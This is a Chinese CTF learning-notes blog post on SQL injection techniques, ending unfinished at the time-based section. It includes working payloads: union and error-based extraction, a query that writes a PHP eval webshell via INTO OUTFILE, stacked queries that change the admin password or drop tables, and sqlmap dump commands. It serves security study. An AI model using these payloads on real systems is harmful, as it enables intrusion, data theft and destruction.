---
title: "SQL大赏！！！"
image: ''
pinned: false
comment: true
published: 2025-12-11
description: "CTF 学习笔记与技术复盘"
category: 知识点
tags: [知识点]
---
# SQL大赏！！！！

这个是记录我学习sql的。

sql是一种对数据库进行管理的语言，在web中最常出现的便是sql注入，其他的题型，我还没见过，所以不做考虑。

SQL 注入就是指 Web 应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

这边是一个非常官方性质的解释，按我自己个人的理解，sql注入就是将我们想要执行的操作通过构造sql的形式，绕过web的过滤或者识别，最终完成的句子。

sql，我个人喜欢的就是分为三种。

## **一.回显型的sql注入**

这种注入是看题目存在回显的时候使用，虽然我遇到的大部分题型都是有回显的。



# #union 注入(联合注入)：



## ##数字型：



`id=-1 UNION SELECT 1, user(), 3(数字型)`

```
源码:
$id = $_GET['id'];
// 注意：这里的 $id 两边没有单引号
$sql = "SELECT * FROM news WHERE id = $id";
```

拼接后得到 `SELECT * FROM news WHERE id = -1 UNION SELECT 1, user(), 3`

**原理**：利用变量周围不存在单引号的情况，将我们希望执行的命令拼接进入sql语句。在这里就是让数据库去找id=-1的内容，但由于id=-1没有内容， 返回为null，再通过union，将前半段命令和后半段命令连接起来，使数据库不显示原本news的东西，而是显示1，`use()`,3。`user()`是mysql中的一个函数，作用是显示当前数据库的登入用户。



`id=-1 UNION SELECT 1, database(), 3(数字型)`

```
源码:
$id = $_GET['id'];
// 注意：无引号保护
$sql = "SELECT * FROM news WHERE id = $id";
```

拼接后得到  `SELECT * FROM news WHERE id = -1 UNION SELECT 1, database(), 3`

**原理：** 利用变量周围不存在单引号的情况，将 SQL 命令拼接进去。这里同样让前半段 `id=-1` 返回空（null）。然后通过 `UNION`，在原本显示其他内容的位置显示`datebase()`函数的值。`database()`: MySQL 的内置函数，作用是显示当前网站正在使用的数据库名称（比如 `ctf_db`）。



`id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()(数字型)`

```
$id = $_GET['id'];
// 注意：无引号保护
$sql = "SELECT * FROM news WHERE id = $id";
```

拼接后得到: `SELECT * FROM news WHERE id = -1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()`

**原理**：除了基本的 `UNION` 拼接外，这里又多了一些内容。

1. `information_schema.tables`: 这是 MySQL 自带的一个元数据库表，里面记录了整个数据库服务器里所有表的名单。
2. `WHERE table_schema=database()`: 加这个条件是为了过滤，只筛选出当前网站数据库里的表名，防止把其他的都查出来。
3. `group_concat(table_name)`: 这一点至关重要。因为网页的回显位通常只有一行，而表名可能有好几个。如果直接查，只能显示第一个。`group_concat` 的作用是将多行查询结果合并成一个字符串（用逗号分隔），全部打包显示出来。



### 小总结：

### 第一阶段：侦察

#### Step 1: 确认注入点 

**目标：** 确定 `SELECT *` 到底代表几列，为后面的 `UNION` 做准备。 **核心命令：** `ORDER BY`

1. **验证数字型：**

   - 输入 `id=2-1`。如果页面显示的内容和 `id=1` 一样，说明数据库执行了减法运算，确认为数字型注入。

2. **二分法/递增法测试：**

   - `id=1 ORDER BY 10` (报错/空) -> 太多了。

   - `id=1 ORDER BY 5` (报错/空) -> 还是多。

   - `id=1 ORDER BY N` (正常显示) -> 这里的 **N** 就是我们要找的关键数字 。

     

#### Step 2: 寻找回显位 

**目标：** 看看这 N 列中，哪几列的数据会被打印在网页上。 **核心命令：** `-1 UNION SELECT` +

**操作：** 让前半部分 ID 失效，强制显示后半部分。

```
id=-1 UNION SELECT 1, 2, 3
```

**观察：** 看看网页上原本显示标题的地方变成了 `2`，还是 `3`？

**结果**：得到输出点



### 第二阶段：取证 

#### Step 3: 爆数

**目标：** 知道我们在哪个库里，版本是多少（版本决定了能不能用 `information_schema`）。 **核心命令：** `database()`, `version()`

```
id=-1 UNION SELECT 1, database(), 3
```

**结论**：得到数据库的名字。



### 第三阶段：拖库

### Step 4: 爆表名

**目标：** 拿到当前数据库下所有的表名。 **核心库：** `information_schema.tables`

```
id=-1 UNION SELECT 1, group_concat(table_name), 3
FROM information_schema.tables
WHERE table_schema = '数据库'
```

**记下来：** 假设结果是 `news, users, logs`。目标显然是 **`users`**。



#### Step 5: 爆列名

**目标：** 拿到 `users` 表里都有哪些字段（比如账号、密码叫什么）。 **核心库：** `information_schema.columns`

```
id=-1 UNION SELECT 1, group_concat(column_name), 3
FROM information_schema.columns
WHERE table_name = 'users'
```

*(注意：如果不同库有同名表，最好加上 `AND table_schema='ctf_db'`)*

- **记下来：** 假设结果是 `id, username, password, flag`。目标显然是 **`flag`** 或者 `password`。

#### Step 6: 爆数据

**目标：** 取出最终的秘密。 **核心表：** 直接查 Step 4 拿到的表。

```
id=-1 UNION SELECT 1, group_concat(username, '~', password), 3
FROM users
```

**结果：** `admin~123456, root~flag{congratulations}`



---



## ##字符型：



除了数字型的，还有字符型的。

两位的区别就是在于，获取参数的地方，字符型的，参数加上了单引号或双引号。

```
假设后端代码是这样的：
$id = $_GET['id'];
// 注意：变量 $id 被单引号包裹
$sql = "SELECT * FROM users WHERE id = '$id'";
```

如果你还用数字型的 Payload：`id=-1 UNION SELECT 1, database(), 3`。

拼接后的 SQL 变成了：`SELECT * FROM users WHERE id = '-1 UNION SELECT 1, database(), 3'`

**结果：** 数据库把我们注入的整体当成了一个普通的字符串 ID。它会去查找 ID 为 `"-1 UNION SELECT 1, database(), 3"` 的用户。这显然查不到，但也不会报错，更不会执行你的命令。所以我们的注入就完全没有起到作用了。

因此，在字符型中，我们就需要学会闭合，注释......

比如说：

#### Payload:

`id=-1' UNION SELECT 1, database(), 3 --+`

```
SELECT * FROM users WHERE id = '$id'
```

SQL注入，拼接后得到： `SELECT * FROM users WHERE id = '-1' UNION SELECT 1, database(), 3 --+'`

**注意**：我们在-1后加了一个单引号，正好这个单引号跟源码中参数前面的单引号拼接成功，变成了   '-1'  ,所以前面就变成了 `SELECT * FROM users WHERE id = '-1'` 刚好完成了前面的闭合。所以我们的UNION就起到了作用。 但还有一个问题，参数后面还有一个单引号，--+就是在这里作用的， `--` 是 SQL 中的注释符，  `+` 在 URL 中代表空格（因为 `--` 后面必须加空格才生效），所以这个时候后面的单引号就被 --+ 注释掉了，并不会对我们的其他内容产生影响，我们的sql注入就从单引号里面逃逸出来了。

其实%23和#也能起到跟--+起到相同的作用。

### 小总结：

字符型的大概流程其实跟数字型的差不多，只是多了一步逃逸。

#### Step 1: 确认是字符型 & 判断闭合符

**目标：** 搞清楚程序员是用单引号 `'` 还是双引号 `"` 包裹参数的。

**测试 1：** 输入 `id=1'` (加个单引号)。				**现象：** 页面报错 (Syntax error)。

**推断：** 很有可能是单引号注入。因为你输入的 `'` 打破了原本的成对引号，变成了 3 个引号。



**测试 2：** 输入 `id=1' --+` (加单引号并注释)。			**现象：** 页面恢复正常。

**结论：** 确认是 **单引号字符型注入**。



#### Step 2: 猜列数 

**注意：** 这里必须带上闭合符和注释符！

- `id=1' ORDER BY 3 --+`
  - **拼接后：** `... WHERE id = '1' ORDER BY 3 --+'`
  - **原理解析：** 如果不加 `'` 和 `--+`，`ORDER BY` 就会被当成 ID 的一部分，导致报错。

#### Step 3: 找回显位

- `id=-1' UNION SELECT 1, 2, 3 --+`
  - **注意：** 同样要有 `'` 和 `--+`。

#### Step 4, 5, 6: 爆数据

和数字型完全一样，只是每次都要记得在最前面加 `'`，最后面加 `--+`。

`id=-1' UNION SELECT 1, database(), 3 --+`。



---



## ##延伸：文件注入

这个我在做sql lab 第七题时候新见到的，

因为不管怎么注入，如果语句正确，题目只会回显：

```
Welcome    Dhakkan
You are in.... Use outfile......
```

说明正确注入时，所有的回显都被后台设置为了这样的语句。

然后采用报错注入，就一直显示sql语句错误。

搜索一番后，才明白，这个延伸类型。

所以，这边就暂时总结一个使用文件注入的背景。

```
无回显环境：当页面不显示任何数据库查询结果，甚至连报错信息都不给时，文件注入可以把结果“写”出来给你看。
```

后端源码：

```
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result = mysqli_query($conn, $sql);
$row = mysqli_fetch_array($result);
if($row) {
    echo "You are in.... Use outfile......";
} else {
    echo "You have an error in your SQL syntax";
}
```

先进行的是探测攻击。

这边用的命令跟前面的差不了多少。

找到恰好使网页显示sql语句错误的闭合方式，然后用 ?id=1 ORDER BY ?  判断列数。

之后便是查看文件的写入路径，毕竟我们得先有路径才能直接文件写入的注入攻击。

**常用的方法两种：**

一.

`phpinfo.php` 直接访问。

当然了这个方法大部分时候都无法成功，所以我们就得用第二种了。

二.

强制报错：

1. 给参数传一个它无法处理的类型，例如：`?id=1[]`（把 ID 变成数组）。

2. 访问一个不存在的文件或故意造成逻辑错误：`?id=-1''))`。

其他的方法待搜集，不过猜是万法。

这边给一个小表格：

| **phpStudy (Windows)** | `C:/phpStudy/WWW/`, `D:/phpStudy/WWW/`, `C:/phpstudy_pro/WWW/` |
| ---------------------- | ------------------------------------------------------------ |
| **XAMPP (Windows)**    | `C:/xampp/htdocs/`                                           |
| **WAMP (Windows)**     | `C:/wamp/www/`                                               |
| **Linux (Apache)**     | `/var/www/html/`, `/var/www/`                                |
| **Linux (Nginx)**      | `/usr/share/nginx/html/`                                     |

可以根据服务器环境直接猜测位置。

当知道了文件绝对路径后，我们就可以进行攻击了。

注入`?id=1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "C:\\phpStudy\\WWW\\shell.php" --+`

### 解释：

**`?id=1'))`**：

- 我们要让前面的查询失效或闭合。
- 我们的 `1'))` 让它变成了 `WHERE id=(('1'))`，语法完美契合。

**`union select 1,2,...`**：

- `union` 要求前后的列数必须一致。
- 前面查的是 3 列，所以我们也要写 3 列。
- 我们将前两列填入数字 `1,2`，**第三列填入我们的木马代码**。这样，写入文件时，木马就会被当作“数据”存进去。

**`'<?php @eval($_POST["cmd"]);?>'`**：

- `@`：抑制错误输出，防止被管理员发现。
- `eval()`：PHP 的灵魂函数，它能把字符串当作代码执行。
- `$_POST["cmd"]`：通过 POST 方式接收名为 `cmd` 的指令。

**`into outfile "C:\\...\\shell.php"`**：

- **双斜杠之谜**：在 Windows 和 SQL 语法中，反斜杠 `\` 具有转义含义。如果你写 `C:\n...`，系统可能把它理解为“换行”。因此必须用 `\\` 表示一个纯粹的反斜杠，或者直接改用 Linux 式的正斜杠 `/`（MySQL 同样支持）。

当这一个攻击能成功后，之后的所有攻击就简单了。

有时候也会存在waf的情况，要注入绕过。



---



# #报错注入：

这同样也是一种存在回显的sql注入，与上面联合注入不同的是，报错注入是因为服务器的源码将union禁止了，正常的显示方式变了。

变成类似这样的：

```
源码：
$result = mysql_query($sql);
if (!$result) {
    // 把数据库的错误信息直接打印到了网页上
    echo mysql_error(); 
}
```

将报错的信息直接打印在了网页上。

这边做一个简单的比较：

| **特性**     | **联合注入 **                                             | **报错注入 **                                            |
| ------------ | --------------------------------------------------------- | -------------------------------------------------------- |
| **逻辑本质** | **拼凑**                                                  | **报错**                                                 |
| **运作方式** | 利用 `UNION` 将原本查询的结果和恶意查询的结果拼接在一起。 | 利用特殊函数的逻辑，在抛出系统错误时，强制包含查询结果。 |
| **数据通道** | **正常的数据展示通道** (网页的正文、标题等)。             | **报错信息提示通道** (网页的 Debug 信息、警告框)。       |
| **SQL 状态** | SQL 语句必须语法正确，逻辑通顺。                          | 构造的 SQL 语句在逻辑上必须是错误的（才能触发报错）。    |

相比来看，报错注入需要的步骤更简单，但报错注入还是存在弊端的，因为报错内容是有限制的，如果报错信息太长了，那么有可能会将flag切断。

这个时候就需要 用`substr()` 或 `substring()`函数将报错信息一段一段的切开来看。

通常来看，报错注入利用的是 MySQL 中最经典的 XML 处理函数。它们本意是用来查询 XML 数据的，但如果 XPath 格式写错了，它们会报错并把错误内容显示出来。

这边引用之前看到的一篇文章。

> https://cloud.tencent.com/developer/article/2160400

常用的报错函数：

`updatexml()` 

**函数原型：** `updatexml(XML_document, XPath_string, new_value)`

1. **`XML_document` **: 也就是你要修改的那段 XML 内容（比如 `<book><title>A</title></book>`）。
2. **`XPath_string` **: 类似于文件路径，告诉数据库你要修改哪一部分（比如 `/book/title`）。
3. **`new_value`** : 你要把那部分内容改成什么（比如 `B`）。

**正常使用时：** 数据库会根据你给的第 2 个参数，去找到第 1 个参数里的对应位置，用第 3 个参数替换掉。

这原本就是一个处理xml数据的函数。

XML数据：

<school>
    <student>
        <id>101</id>
        <name>张三</name>
        <score>95</score>
    </student>
    <student>
        <id>102</id>
        <name>李四</name>
        <score>88</score>
    </student>
</school> 

看起来很像html。

举个例子，就以上面的XML数据为源码，

`updatexml(xml_data,'/school/student[1]/score','<score>100</score>')`

使用这个函数，在xml文章中找到第一个student的分数部分，将其改为100。

**而在报错注入中，我们的使用就不是这样了：**

`updatexml(1, concat(0x7e, (select user()), 0x7e), 1)`

**因为存在两个机制：**

**机制 A：**MySQL 的报错机制 `updatexml` 的第二个参数要求必须是合法的 XPath 格式（例如 `/root/node`）。 如果你传入一个包含特殊符号（如波浪号 `~`）的字符串，MySQL 无法解析它，就会报错。 最关键的是：MySQL 会在报错信息里，把这个“错误的字符串”完整地打印出来！

**机制 B：**SQL 的执行顺序 SQL 语句在执行函数时，会先计算参数里的子查询，然后再执行函数本身。

所以在我们的报错注入的例子中，数据库会先执行 `select user()), 0x7e)` 去把数据库当前的账号打印出来，类似`root@localhost` ，`0x7e` 是波浪号的16进制，在这里的作用是拼接内容，变成 `'~root@localhost~'` 而在函数 `updatexml()` 中，因为第二个的参数必须为有效的 XPath 路径，而 `'~root@localhost~'` 不是有效路径，因此数据库就会报错，将当前账号的信息以报错的内容打印在网页上。

如果不加波浪号，有可能会因为格式合法，导致数据库没有报错，从而看不见我们要的信息。



以上就是简单的报错注入的例子。

当然了，报错注入利用的函数还有很多，有可能因为题目不同的黑名单，导致 `updatexml()` 这个函数用不了，这边简单记录几个其他函数以及它们的用法，更具体的我会在开一个文章写。



---



### 1. `extractvalue()`

这是最接近 `updatexml()` 的替代品，原理完全相同（都是 XPath 语法错误）。

```
AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))
```



### 2. `floor()` + `rand()` + `group by`

这是最经典的报错注入方式，通杀 MySQL 5.x 到 8.x 版本。利用 `group by` 在临时表插入数据时的主键冲突（Duplicate entry）报错。

```
AND (SELECT 1 FROM (SELECT count(*), concat(user(), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)
```



### 3. 几何函数报错 

在较新的 MySQL 版本（尤其是 5.7 和 8.0）中，引入了很多处理几何数据的函数。如果传入非法的格式，它们也会报错并回显数据。

#### A. `ST_LatFromGeoHash()` 

```
AND ST_LatFromGeoHash(concat(0x7e, (SELECT user()), 0x7e))
```

#### B. `ST_LongFromGeoHash()`

```
AND ST_LongFromGeoHash(concat(0x7e, (SELECT user()), 0x7e))
```

#### C. `ST_PointFromGeoHash()`

```
AND ST_PointFromGeoHash(concat(0x7e, (SELECT user()), 0x7e))
```



### 4. GTID 函数报错

利用全局事务标识符（GTID）相关函数进行报错。

#### A. `GTID_SUBSET()`

```
AND GTID_SUBSET(concat(0x7e, (SELECT user()), 0x7e), 1)
```

#### B. `GTID_SUBTRACT()`

```
AND GTID_SUBTRACT(concat(0x7e, (SELECT user()), 0x7e), 1)
```



### 5. 数学/溢出报错

利用数学指数函数 `exp()` 产生双精度浮点数溢出错误。

```
AND exp(~(SELECT * FROM (SELECT user()) a))
```



| **函数/方法**         | **长度限制** | **MySQL 版本** | **特点**                       |
| --------------------- | ------------ | -------------- | ------------------------------ |
| **updatexml**         | 32 字符      | 全版本         | 最常用，但有长度限制           |
| **extractvalue**      | 32 字符      | 全版本         | updatexml 的完美替代           |
| **floor + group by**  | **无限制**   | 全版本         | 适合获取长数据，Payload 较繁琐 |
| **ST_LatFromGeoHash** | 32 字符      | 5.7+           | 适合绕过对 "xml" 的过滤        |
| **GTID_SUBSET**       | 32 字符      | 5.7+           | 另一种绕过思路                 |



当然了，报错注入不可能只有这么点，具体情况具体分析。



---



# #堆叠注入：

这种注入之所以叫“堆叠”，是因为它的逻辑非常霸道：**它不仅想修改原来的 SQL 语句，还想在后面强行塞进几条全新的 SQL 语句。**

在 SQL 中，分号 `;` 是语句的分隔符。堆叠注入就是利用这个分号，把多条独立的命令像“叠罗汉”一样堆在一起执行。

### 背景：

并不是所有的环境都能玩堆叠。它有两个硬性门槛：

1. **后端代码支持**：比如 PHP 中必须使用 **`mysqli_multi_query()`** 函数。如果只用普通的 `mysqli_query()`，它遇到分号就会报错或者只执行第一条，堆叠就失效了。
2. **数据库类型**：MySQL、MSSQL、PostgreSQL 支持得很香，但 Oracle 默认就不太支持这种玩儿法。

### 逻辑对比：

| **特性**     | **联合查询 (Union)**          | **堆叠注入 (Stacked)**                           |
| ------------ | ----------------------------- | ------------------------------------------------ |
| **本质**     | 还在执行原来的那条 `SELECT`。 | 彻底结束上一条，开启全新的命令。                 |
| **操作限制** | 只能执行查询（SELECT）。      | 增删改查样样行（INSERT, UPDATE, DELETE, DROP）。 |
| **回显要求** | 需要回显位。                  | 哪怕没回显，只要命令执行了就行。                 |

------

### Step 1: 确认漏洞 & 尝试闭合

和字符型注入一样，我们先得“逃逸”出来。

假设后端源码：

```
$uname = $_GET['uname'];
$sql = "SELECT * FROM users WHERE uname = '$uname'";
mysqli_multi_query($db, $sql); // 关键函数！
```

Payload 探测：

`?uname=admin'; select sleep(5); --+`

拼接后的 SQL：

SELECT * FROM users WHERE uname = 'admin'; select sleep(5); --+'

现象： 如果网页转了 5 秒才加载出来，说明堆叠注入成功生效了！它执行完查询后，又乖乖去跑了我们的 sleep 命令。

------

### Step 2: 绕过死板的逻辑

有时候，题目会有一个非常恶心的判断：

`if ($ $ row[1] === $uname) { die($flag); }`

这个逻辑要求数据库查出来的结果必须和输入的攻击代码一模一样。这时候 UNION 就没戏了，因为 UNION 出来的东西很难同时满足“注入”又满足“等式”。

**攻击思路：先存后取。**

1. 第一步：注入一条你喜欢的用户数据。

   Payload: **`?uname=-1'; INSERT INTO users(id, uname, password) VALUES(888, 'moyu', '123'); --+`**

   这时候，数据库里就多了一个用户名为 'moyu' 的人。

2. 第二步：用这个合法的用户名登录。

   Payload: **`?uname=moyu`**

   后端执行：SELECT * FROM users WHERE uname = 'moyu';

   PHP 判断：if ('moyu' === 'moyu') -> 成立！							**[HNCTF 2022 WEEK4]fun_sql(实战)**

------

### Step 3: 极致破坏

既然能执行任何命令，堆叠注入在渗透测试中往往用来干这些事：

1. **改密码**：`1'; UPDATE users SET password='123' WHERE username='admin'; --+`

2. **删库**：`1'; DROP TABLE users; --+`

3. 重命名表名（绕过黑名单）：

   有些题目过滤了 flag 关键字，我们可以把 users 改名成 xxx，再把包含 flag 的表改名成 users：

   **`1'; RENAME TABLE users TO users1; RENAME TABLE words TO users; --+`**

------

### 小总结：

堆叠注入就像是给了你一个远程的 SQL 终端。

- **优点**：权限极高，可以修改数据，不依赖回显。
- **缺点**：极其依赖 `multi_query` 这个函数，实战中这种配置其实不多。























---



## 二.无回显的sql注入

这类型的题目主要就是，不管你注入什么，完全就没有回显，是错是对完全不知道。



# #布尔盲注：

```
简单源码：
<?php
$conn = mysqli_connect("127.0.0.1", "root", "root", "demo_db");
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $sql);
if ($result && mysqli_num_rows($result) > 0) {
    exit("User Exists!"); 
} else
    exit("User Not Found!");
}
?>
```

简单讲就是指我们注入的sql命令执行了，但它并不回显，而是跟数据库的记录进行比较，有就是一个简单的固定的回显，没有就是无回显或者其他的什么之类的，后端并没有讲执行命令的结果直接显示出来，而只是以一个有或者没有的形式回答你，听起来很像海龟汤。

这个时候，我想到的就是直接sqlmap试一试，就比如sql lab的第八关，当我目前会的sql注入全试一遍，没有结果后，我就直接进行了sqlmap。

`sqlmap -u "http://localhost/Less-8/?id=1" --batch`

这个之后我也会记录在我的sqlmap学习记录中的。

使用的指令就是我上面的这个一个，`sqlmap -u "url" --batch`

![alt text](/images/QQ20251229-212310.png)

简单扫一下，就出结果了，显示的是存在布尔盲注和时间盲注。

时间盲注就不在这里讲了。

关键看布尔盲注，布尔盲注的原理就像是爆破，你一个一个推东西给服务器，直到服务器说对，你这个命令是对的，你这个推测是对的。

所以，正常来说，手敲是很艰难的。

我先学习用sqlmap这个工具，以后再尝试py脚本。

`sqlmap -u "..." --batch --current-db`

爆破数据库。

![alt text](/images/QQ20251229-213112.png)

回显就直接出来了security，这个数据库名。

再通过数据库名直接爆破表名。

`sqlmap -u "..." --batch -D security --tables`

![alt text](/images/QQ20251229-213313.png)

这边也是同样直接直接爆了出来。

有了表名，再爆一爆数据。

`sqlmap -u "..." --batch -D security -T users --dump`

![alt text](/images/QQ20251229-213849.png)

看这边也是一下子就出来了。

sqlmap确实很好用。



---



# #时间盲注：

时间盲注的使用背景就是当应用程序对非法 SQL 语句不返回任何错误信息，且页面内容在无论查询成功或失败时都保持一致（并且布尔盲注失效）时，才会利用数据库的时间延迟函数来判断信息。

这个注入方式的核心函数为：













-

---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
